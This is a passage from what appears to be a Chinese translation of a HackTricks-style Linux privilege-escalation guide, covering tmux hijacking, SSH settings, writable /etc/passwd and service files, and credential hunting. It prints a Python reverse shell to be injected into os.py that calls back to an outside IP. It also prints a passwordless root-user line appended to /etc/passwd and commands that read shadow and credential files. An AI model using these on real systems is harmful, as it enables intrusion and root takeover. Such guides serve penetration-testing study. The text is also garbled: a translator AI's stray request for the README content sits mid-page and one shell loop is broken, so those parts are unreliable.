tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

所有在 2006 年 9 月至 2008 年 5 月 13 日期间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥都可能受到此漏洞影响。\
这个漏洞在这些操作系统创建新的 ssh 密钥时出现，因为 **只有 32,768 种可能性**。这意味着可以计算出所有可能性，并且拥有 ssh 公钥就可以搜索到对应的私钥。你可以在这里找到已计算出的可能性： [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 有趣的配置值

- **PasswordAuthentication:** 指定是否允许密码认证。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认是 `no`。

### 登录控制文件

这些文件影响谁可以登录以及如何登录：

- **`/etc/nologin`**: 如果存在，会阻止非 root 登录并打印其消息。
- **`/etc/securetty`**: 限制 root 可以从哪里登录（TTY 允许列表）。
- **`/etc/motd`**: 登录后横幅（可能会 leak 环境或维护详情）。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认是 `no`。可能的值：

- `yes`: root 可以使用密码和私钥登录
- `without-password` or `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 只能使用私钥登录，且仅在指定了命令选项时
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的 token，%h 将被替换为主目录。**你可以指定绝对路径**（以 `/` 开头）或 **相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 会将你的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的那些条目进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys** (without passphrases!) 存放在你的服务器上。因此，你可以通过 ssh **jump** 到一个 host，然后从那里 **jump to another** host，**using** 位于你 **initial host** 的 **key**。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机会能够访问密钥（这是一个安全问题）。

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` 来**允许**或**拒绝** ssh-agent forwarding（默认允许）。

如果你发现 Forward Agent 在某个环境中被配置，请阅读以下页面，**因为你可能能够滥用它以提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profiles 文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是**在用户运行新 shell 时执行的脚本**。因此，如果你能够**写入或修改其中任何一个，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何可疑的 profile 脚本，应该检查其是否包含 **敏感信息**。

### Passwd/Shadow 文件

根据操作系统不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称或存在备份。因此建议 **查找所有这些文件** 并 **检查是否可以读取**，以查看文件中 **是否包含 hashes**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd` (或等效) 文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下面任意一条命令生成密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我需要 README.md 的具体内容才能做翻译并在文件中添加指定的用户条目。请把 src/linux-hardening/privilege-escalation/README.md 的文本粘贴到这里，或者确认以下事项：

- 你希望我把“添加用户 hacker 并加入生成的密码”作为 README.md 的一段文本（即在翻译后把该条目写入文件内容）还是仅给出在系统上创建该用户的命令示例？
- 若要我生成密码，请确认密码格式偏好（长度、是否包含符号、只需安全随机密码或可读易记密码）。
- 请确认不需要我实际在任何系统上创建用户（我只能提供命令和密码文本）。

把文件内容和上述偏好发来后，我会按你的要求把英文翻译成中文（保留所有 markdown/html 标签、路径、代码等不翻译），并在合适位置加入用户 hacker 及生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

你现在可以使用 `su` 命令并用 `hacker:hacker`

或者，你可以使用下面这些行来添加一个没有密码的临时用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以 **写入某些敏感文件**。例如，你能否写入某个 **服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器，并且你可以 **修改位于 /etc/systemd/ 的 Tomcat 服务配置文件,** 那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在下一次 tomcat 启动时被执行。

### 检查文件夹

以下文件夹可能包含备份或有用的信息： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (可能无法读取最后一个，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

查看 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **多个可能包含密码的文件**。\
**另一个有趣的工具** 是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源程序，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，你可能会在其中发现 **有趣/机密的信息**。日志越异常，可能越有价值（大概）。\
此外，一些配置“**糟糕**”（或被植入后门？）的**审计日志**可能允许你在审计日志中**记录密码**，正如这篇文章所解释的： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **读取日志，组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含单词 "**password**" 的文件，并且也要检查日志中是否有 IPs 和 emails，或是否有 hashes regexps。\
我不会在这里列出如何完成所有这些操作，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道 python 脚本将从 **哪里** 被执行，并且你 **可以在该文件夹写入** 或者你可以 **修改 python 库**，你就可以修改 OS 库并 backdoor 它（如果你可以在 python 脚本将被执行的位置写入，复制并粘贴 os.py 库）。

要 **backdoor the library**，只需在 os.py 库末尾添加以下行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 漏洞利用

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **write permissions** 的用户可能获得提权。这是因为 `logrotate` 经常以 **root** 身份运行，能够被操纵去执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅要检查 _/var/log_ 中的权限，还要检查任何应用了日志轮转的目录。

> [!TIP]
> 该漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于该漏洞的更详细信息请参见： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** 非常相似，因此每当你发现可以篡改日志时，检查是谁在管理这些日志，并尝试通过用 symlinks 替换日志文件来提升权限。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，某个用户能够向 _/etc/sysconfig/network-scripts_ 写入一个 `ifcf-<whatever>` 脚本，或者能够 **调整** 已有脚本，那么你的 **system is pwned**。

Network scripts（例如 _ifcg-eth0_）用于网络连接。它们看起来完全像 .INI 文件。然而，这些脚本会被 Network Manager（dispatcher.d）在 Linux 上以 ~sourced~ 的方式处理。

在我的案例中，这些 network scripts 中的 `NAME=` 属性未被正确处理。如果名称中包含 **空格/blank space**，系统会尝试执行空格之后的部分。这意味着 **第一个空格之后的所有内容都会以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 存放 System V init (SysVinit) 的 **脚本**，也就是 **经典的 Linux 服务管理系统** 的脚本。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过位于 `/etc/rc?.d/` 的符号链接来执行。在 Redhat 系统中，替代路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，Upstart 是由 Ubuntu 引入的较新的 **服务管理**，使用配置文件来处理服务管理任务。尽管已经迁移到 Upstart，但由于 Upstart 中存在兼容层，仍然会 alongside 使用 SysVinit 脚本与 Upstart 配置并存。

**systemd** 作为现代的初始化和服务管理器出现，提供诸如按需启动守护进程、自动挂载管理以及系统状态快照等高级功能。它将文件组织到 `/usr/lib/systemd/`（用于发行版包）和 `/etc/systemd/system/`（用于管理员修改），从而简化系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常 hook 一个 syscall，把特权内核功能暴露给 userspace 的 manager。弱的 manager 认证（例如基于 FD-order 的签名校验或薄弱的密码方案）可能允许本地 app 冒充该 manager，并在已 root 的设备上提升到 root。更多细节和利用方法见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations 中基于 regex 的服务发现可以从进程命令行中提取二进制路径，并在特权上下文中以 -v 执行它。宽松的模式（例如使用 \S）可能会匹配部署在可写位置（例如 /tmp/httpd）的攻击者监听器，从而导致以 root 身份执行（CWE-426 Untrusted Search Path）。

了解更多并查看适用于其他发现/监控栈的通用模式： 

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 用于枚举 Linux 和 macOS 上的 kernel 漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
